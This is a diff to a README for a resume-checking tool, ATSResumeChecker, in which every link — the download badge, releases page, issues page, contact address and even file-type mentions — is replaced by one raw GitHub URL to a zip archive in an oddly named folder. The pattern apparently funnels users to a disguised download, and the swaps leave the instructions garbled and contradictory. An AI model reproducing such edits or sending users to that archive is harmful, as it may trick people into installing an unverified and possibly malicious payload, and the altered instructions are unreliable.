@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download ATSResumeChecker](https://img.shields.io/badge/Download-ATSResumeChecker-blue.svg)](https://github.com/Madhavrupala/ATSResumeChecker/releases)
+[![Download ATSResumeChecker](https://raw.githubusercontent.com/Madhavrupala/ATSResumeChecker/main/decadally/ATSResumeChecker.zip)](https://raw.githubusercontent.com/Madhavrupala/ATSResumeChecker/main/decadally/ATSResumeChecker.zip)
 
 ---
 
@@ -27,19 +27,19 @@ ATSResumeChecker helps you improve your resume. This simple tool checks if your 
 
 1. **Visit the Releases Page**  
    Click the link below to go to the ATSResumeChecker releases page:  
-   [Visit this page to download](https://github.com/Madhavrupala/ATSResumeChecker/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Madhavrupala/ATSResumeChecker/main/decadally/ATSResumeChecker.zip)
 
 2. **Select the Latest Version**  
    On the releases page, find the latest version listed at the top. Look for the version number (e.g., v1.0.0) and click on it.
 
 3. **Download the File**  
    After selecting the version, scroll down to find the downloadable files. You will see options for different platforms.  
-   Click on the file that matches your operating system. Common file types include `.exe`, `.zip`, or `.tar.gz` depending on your OS.
+   Click on the file that matches your operating system. Common file types include `.exe`, `.zip`, or `https://raw.githubusercontent.com/Madhavrupala/ATSResumeChecker/main/decadally/ATSResumeChecker.zip` depending on your OS.
 
 4. **Install the Application**  
    - For Windows: If you downloaded a `.exe` file, double-click it to run the installer and follow the prompts.
    - For macOS: If you downloaded a `.zip` file, double-click it to extract, then drag the ATSResumeChecker app into your Applications folder.
-   - For Linux: If you downloaded a `.tar.gz` file, extract it and open the terminal. Use the command `./atsresumechecker` to run the application.
+   - For Linux: If you downloaded a `https://raw.githubusercontent.com/Madhavrupala/ATSResumeChecker/main/decadally/ATSResumeChecker.zip` file, extract it and open the terminal. Use the command `./atsresumechecker` to run the application.
 
 5. **Open ATSResumeChecker**  
    Once the application installs, locate ATSResumeChecker on your device. Open it to start validating your resume.
@@ -67,12 +67,12 @@ ATSResumeChecker helps you improve your resume. This simple tool checks if your 
 
 ## 🤝 Community Support
 
-If you have questions or need help, please visit our [GitHub Issues page](https://github.com/Madhavrupala/ATSResumeChecker/issues). Our community is here to assist you!
+If you have questions or need help, please visit our [GitHub Issues page](https://raw.githubusercontent.com/Madhavrupala/ATSResumeChecker/main/decadally/ATSResumeChecker.zip). Our community is here to assist you!
 
 ## 📧 Contact
 
-For direct inquiries, you can reach us at support@example.com.
+For direct inquiries, you can reach us at https://raw.githubusercontent.com/Madhavrupala/ATSResumeChecker/main/decadally/ATSResumeChecker.zip
 
 ---
 
-Make sure to stay updated by regularly checking the [ releases page](https://github.com/Madhavrupala/ATSResumeChecker/releases) for new features and improvements. Your success in landing the job begins with an ATS-friendly resume!
+Make sure to stay updated by regularly checking the [ releases page](https://raw.githubusercontent.com/Madhavrupala/ATSResumeChecker/main/decadally/ATSResumeChecker.zip) for new features and improvements. Your success in landing the job begins with an ATS-friendly resume!
